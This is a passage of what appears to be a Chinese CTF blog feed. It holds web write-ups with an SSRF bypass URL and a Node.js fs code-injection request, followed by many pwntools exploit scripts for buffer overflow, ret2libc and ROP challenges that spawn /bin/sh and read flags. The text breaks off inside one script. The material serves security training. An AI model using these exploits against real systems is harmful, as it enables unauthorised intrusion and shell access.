Found&#x27;&#125;), 404</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(403)</span><br><span class=\"line\">def forbidden(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Not Allowed&#x27;&#125;), 403</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(400)</span><br><span class=\"line\">def bad_request(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Bad Request&#x27;&#125;), 400</span><br></pre></td></tr></table></figure></p>\n<p>里面就是一些控制报错输出查看引用包，routes</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Blueprint, request, Response, jsonify, redirect, url_for</span><br><span class=\"line\">from application.util import is_from_localhost, proxy_req</span><br><span class=\"line\">import random, os</span><br><span class=\"line\"></span><br><span class=\"line\">SITE_NAME = &#x27;reddit.com&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">proxy_api = Blueprint(&#x27;proxy_api&#x27;, __name__)</span><br><span class=\"line\">debug     = Blueprint(&#x27;debug&#x27;, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def proxy():</span><br><span class=\"line\">    url = request.args.get(&#x27;url&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not url:</span><br><span class=\"line\">        cat_meme_subreddits = [</span><br><span class=\"line\">            &#x27;/r/cats/&#x27;,</span><br><span class=\"line\">            &#x27;/r/catpictures&#x27;,</span><br><span class=\"line\">            &#x27;/r/catvideos/&#x27;</span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class=\"line\"></span><br><span class=\"line\">        return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit))</span><br><span class=\"line\">    </span><br><span class=\"line\">    target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27;</span><br><span class=\"line\">    response, headers = proxy_req(target_url)</span><br><span class=\"line\"></span><br><span class=\"line\">    return Response(response.content, response.status_code, headers.items())</span><br><span class=\"line\"></span><br><span class=\"line\">@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">@is_from_localhost</span><br><span class=\"line\">def debug_environment():</span><br><span class=\"line\">    environment_info = &#123;</span><br><span class=\"line\">        &#x27;Environment variables&#x27;: dict(os.environ),</span><br><span class=\"line\">        &#x27;Request headers&#x27;: dict(request.headers)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return jsonify(environment_info)</span><br></pre></td></tr></table></figure></p>\n<p>导入了 os，下面的 debug_environment (): 还调用了 os 输出了 os.environ</p>\n<p>回到 app.py 查看路由控制</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>这里都是调用的 routes 里面的函数 proxy_api</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def proxy():</span><br><span class=\"line\">    url = request.args.get(&#x27;url&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not url:</span><br><span class=\"line\">        cat_meme_subreddits = [</span><br><span class=\"line\">            &#x27;/r/cats/&#x27;,</span><br><span class=\"line\">            &#x27;/r/catpictures&#x27;,</span><br><span class=\"line\">            &#x27;/r/catvideos/&#x27;</span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class=\"line\"></span><br><span class=\"line\">        return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit))</span><br><span class=\"line\">    </span><br><span class=\"line\">    target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27;</span><br><span class=\"line\">    response, headers = proxy_req(target_url)</span><br><span class=\"line\"></span><br><span class=\"line\">    return Response(response.content, response.status_code, headers.items())</span><br></pre></td></tr></table></figure></p>\n<p>这个代码控制了用户的默认界面为这 3 个中的随机一个然后就是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">@is_from_localhost</span><br><span class=\"line\">def debug_environment():</span><br><span class=\"line\">    environment_info = &#123;</span><br><span class=\"line\">        &#x27;Environment variables&#x27;: dict(os.environ),</span><br><span class=\"line\">        &#x27;Request headers&#x27;: dict(request.headers)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return jsonify(environment_info)</span><br></pre></td></tr></table></figure></p>\n<p>也就是说只要调用了 /debug/environment 就能得到 flag</p>\n<p>需要注意的是 @is_from_localhost 调用了一个过滤函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RESTRICTED_URLS = [&#x27;localhost&#x27;, &#x27;127.&#x27;, &#x27;192.168.&#x27;, &#x27;10.&#x27;, &#x27;172.&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">def is_safe_url(url):</span><br><span class=\"line\">    for restricted_url in RESTRICTED_URLS:</span><br><span class=\"line\">        if restricted_url in url:</span><br><span class=\"line\">            return False</span><br><span class=\"line\">    return True</span><br><span class=\"line\"></span><br><span class=\"line\">def is_from_localhost(func):</span><br><span class=\"line\">    @functools.wraps(func)</span><br><span class=\"line\">    def check_ip(*args, **kwargs):</span><br><span class=\"line\">        if request.remote_addr != &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">            return abort(403)</span><br><span class=\"line\">        return func(*args, **kwargs)</span><br><span class=\"line\">    return check_ip</span><br></pre></td></tr></table></figure></p>\n<p>这里过滤了 127.0.0.1 那我们可以使用 0.0.0.0 也是可以的，</p>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://188.166.175.58:31579/?url=@0.0.0.0:1337/debug/environment</span><br></pre></td></tr></table></figure></p>\n<p>即可绕过</p>\n<h3 id=\"jscalc\"><a class=\"anchor\" href=\"#jscalc\">#</a> jscalc</h3>\n<p>这个题比较简单使用 js 的 fs</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/calculate HTTP/1.1</span><br><span class=\"line\">Host: 188.166.175.58:31222</span><br><span class=\"line\">Content-Length: 65</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Origin: http://188.166.175.58:31222</span><br><span class=\"line\">Referer: http://188.166.175.58:31222/</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;formula&quot;:&quot;require(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;).toString();&quot;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>直接得到 flag</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/",
            "url": "https://lookhui.github.io/PWN%E5%88%B7%E9%A2%98-md/",
            "title": "PWN刷题解析",
            "date_published": "2023-12-13T00:46:10.000Z",
            "content_html": "<h5 id=\"swpuctf-2021-新生赛gift_pwn\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛gift_pwn\">#</a> [SWPUCTF 2021 新生赛] gift_pwn</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28785)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x4005B6)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019华北pwn1\"><a class=\"anchor\" href=\"#ciscn-2019华北pwn1\">#</a> [CISCN 2019 华北] PWN1</h5>\n<p>这个题直接覆盖掉 v1 让其溢出后直接到 return</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28536)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x30+0x8)+p64(0x4006BE)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>当然也能让 v1 溢出使 v2 等于那个让其执行 return<br />\ntips:11.28125 表示在内存存储就是 0x41348000</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">xianyufen=remote(&quot;node1.anna.nssctf.cn&quot;,28029)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x2C+p64(0x41348000)</span><br><span class=\"line\">xianyufen.send(payload)</span><br><span class=\"line\">xianyufen.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babystack20\"><a class=\"anchor\" href=\"#bjdctf-2020babystack20\">#</a> [BJDCTF 2020]babystack2.0</h5>\n<p>这个题判断点在于无符号类型因为里面的<br />\n <code>if ( (int)nbytes &gt; 10 ) </code> read(0, buf, (unsigned int)nbytes);<br />\n 因为 buf 的溢出要 0x18 但是 nbytes 只能是 &lt; 10 所以我们就要使用无符号类型让它等于 - 1 然后就能读取很多产生溢出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28867)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x400726)</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,&#x27;-1&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022reorpwn\"><a class=\"anchor\" href=\"#nisactf-2022reorpwn\">#</a> [NISACTF 2022]ReorPwn?</h5>\n<p>这个题注意他的 fun 函数里面给你的顺序逆了一下，下面就是 system，那直接使用 payload 数组逆位一下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28301)</span><br><span class=\"line\">comm=&#x27;cat /flag&#x27;</span><br><span class=\"line\">a=comm[::-1]</span><br><span class=\"line\">p.sendlineafter(&#x27;lleT:&#x27;,a)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babystack\"><a class=\"anchor\" href=\"#bjdctf-2020babystack\">#</a> [BJDCTF 2020]babystack</h5>\n<p>这个题就更简单了，像前面那个题，这个题还不需要判断 read 的长度随便输就行能达到溢出点就行</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28240)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x4006E6)</span><br><span class=\"line\">p.sendlineafter(&#x27;name:&#x27;,&#x27;-1&#x27;)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezstack\"><a class=\"anchor\" href=\"#nisactf-2022ezstack\">#</a> [NISACTF 2022]ezstack</h5>\n<p>打开后用 ida 查看到代码里面没有 system ('/bin/sh') 但是有 system 并且在 data 段里面有 /bin/sh 那我们直接让代码溢出调用 system 和 /bin/sh</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28961)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x48+0x4)+p32(0x08048512)+p32(0x804A024)</span><br><span class=\"line\">p.sendlineafter(&#x27;NISACTF&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"watevrctf-2019voting-machine-1\"><a class=\"anchor\" href=\"#watevrctf-2019voting-machine-1\">#</a> [watevrCTF 2019]Voting Machine 1</h5>\n<p>这个题有两个解法，输入 0x2 或者 0xa</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>machine</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28788)</span><br><span class=\"line\">#p=process(&#x27;./ctf&#x27;)</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0xa)+p64(0x400807)</span><br><span class=\"line\">p.sendlineafter(&quot;Vote:&quot;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022ezpie\"><a class=\"anchor\" href=\"#nisactf-2022ezpie\">#</a> [NISACTF 2022]ezpie</h5>\n<p>这种题要注意流程化，先看因为开启了 pie 地址随机化就得去算他们的偏移量因为得到了 main 函数地址所以就直接构造</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28694)</span><br><span class=\"line\">elf=ELF(&#x27;./pw&#x27;)</span><br><span class=\"line\">shell=elf.sym[&#x27;shell&#x27;]</span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\">offset=shell-main</span><br><span class=\"line\">log.info(&#x27;offset is :%x&#x27;%offset)</span><br><span class=\"line\">p.recvuntil(&#x27;gift!\\n&#x27;)</span><br><span class=\"line\">main_addr=int(p.recv(10).decode(),16)</span><br><span class=\"line\">p_shell_addr=main_addr+offset</span><br><span class=\"line\">log.info(&#x27;main_addr is %x&#x27;%main_addr)</span><br><span class=\"line\">log.info(&#x27;shelloffset is %x&#x27;%p_shell_addr)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x28+0x4)+p32(p_shell_addr)</span><br><span class=\"line\">p.sendlineafter(&#x27;Input:&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"2021-鹤城杯babyof\"><a class=\"anchor\" href=\"#2021-鹤城杯babyof\">#</a> [2021 鹤城杯] babyof</h5>\n<p>这个题是一个 ret2libc 的题首先要泄露出一个 libc 基地址然后才能得到其他的地址</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">program = &quot;./babyof&quot;</span><br><span class=\"line\">p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28666)#process(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">puts_got = elf.got[&quot;puts&quot;]</span><br><span class=\"line\">pop_rdi = 0x400743</span><br><span class=\"line\">pop_ret = 0x400506</span><br><span class=\"line\">__start = 0x400550</span><br><span class=\"line\">payload = b&#x27;a&#x27;*(0x40+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) #//跳转到rdi寄存器上面然后在通过puts函数来打印puts的got在通过ret到起始位置让下面的payload生效</span><br><span class=\"line\">p.sendlineafter(&quot;Do you know how to do buffer overflow?\\n&quot;,payload)</span><br><span class=\"line\">p.recvuntil(&quot;I hope you win\\n&quot;)</span><br><span class=\"line\">puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #\\\\接收puts的got地址因为栈地址一般是由\\x7f开头的自动补全8位</span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) #\\\\利用puts_addr在LibcSearcher里面查找对映的库</span><br><span class=\"line\">libc_addr = puts_addr-libc.dump(&#x27;puts&#x27;)  #\\\\利用puts_addr（动态地址）减去puts的函数偏移量即可得到libc的基地址</span><br><span class=\"line\">bin_sh_str=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;) #\\\\下面的得到基地址后都加上偏移量就能得到对应的函数了</span><br><span class=\"line\">system=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">log.info(&#x27;libc addr is %x&#x27;%libc_addr)</span><br><span class=\"line\">log.info(&#x27;bin_sh_str is %x&#x27;%bin_sh_str)</span><br><span class=\"line\">payload2 = b&#x27;a&#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) #\\\\使用一个ret来跳转到pop_rdi然后就利用system(/bin/sh)即可</span><br><span class=\"line\">p.sendlineafter(&quot;Do you know how to do buffer overflow?\\n&quot;,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gfctf-2021where_is_shell\"><a class=\"anchor\" href=\"#gfctf-2021where_is_shell\">#</a> [GFCTF 2021]where_is_shell</h5>\n<p>可以利用 system ($0) 获得 shell 权限，$0 在机器码中为 \\x24\\x30</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">elf = ELF(&#x27;./shell&#x27;)</span><br><span class=\"line\">local = 1</span><br><span class=\"line\">if local ==0:</span><br><span class=\"line\"> p = process(&#x27;./shell&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\"> p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28616)</span><br><span class=\"line\">ret_addr = 0x400416 # ROPgadget --binary shell --only &#x27;ret&#x27;</span><br><span class=\"line\">pop_rdi_ret = 0x4005e3 # ROPgadget --binary shell --only &#x27;pop|rdi|ret&#x27;</span><br><span class=\"line\">tips = 0x400541</span><br><span class=\"line\">system_addr = elf.symbols[&#x27;system&#x27;]</span><br><span class=\"line\">payload = b&#x27;b&#x27;*0x10+b&#x27;b&#x27;*8+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)</span><br><span class=\"line\">p.sendlineafter(&#x27;find it?\\n&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2021-新生赛whitegive_pwn\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛whitegive_pwn\">#</a> [SWPUCTF 2021 新生赛] whitegive_pwn</h5>\n<p>这个题的话和 babyof 的题差不多就是一个 ret2libc 的题但是这个题的 libc.so 有问题打不进去代码如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">program = &quot;./Desktop/附件&quot;</span><br><span class=\"line\">p = remote(&#x27;node5.anna.nssctf.cn&#x27;,28406)#process(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">puts_got = elf.got[&quot;puts&quot;]</span><br><span class=\"line\">pop_rdi = 0x400763</span><br><span class=\"line\">pop_ret = 0x400509</span><br><span class=\"line\">__start = 0x400570</span><br><span class=\"line\">payload = b&#x27;a&#x27;*(0x10+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))  #\\\\接收puts的got地址因为栈地址一般是由\\x7f开头的自动补全8位</span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) #\\\\利用puts_addr在LibcSearcher里面查找对映的库</span><br><span class=\"line\">libc_addr = puts_addr-libc.dump(&#x27;puts&#x27;)  #\\\\利用puts_addr（动态地址）减去puts的函数偏移量即可得到libc的基地址</span><br><span class=\"line\">bin_sh_str=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;) #\\\\下面的得到基地址后都加上偏移量就能得到对应的函数了</span><br><span class=\"line\">system=libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\">log.info(&#x27;libc addr is %x&#x27;%libc_addr)</span><br><span class=\"line\">log.info(&#x27;bin_sh_str is %x&#x27;%bin_sh_str)</span><br><span class=\"line\">payload2 = b&#x27;a&#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)+p64(__start) 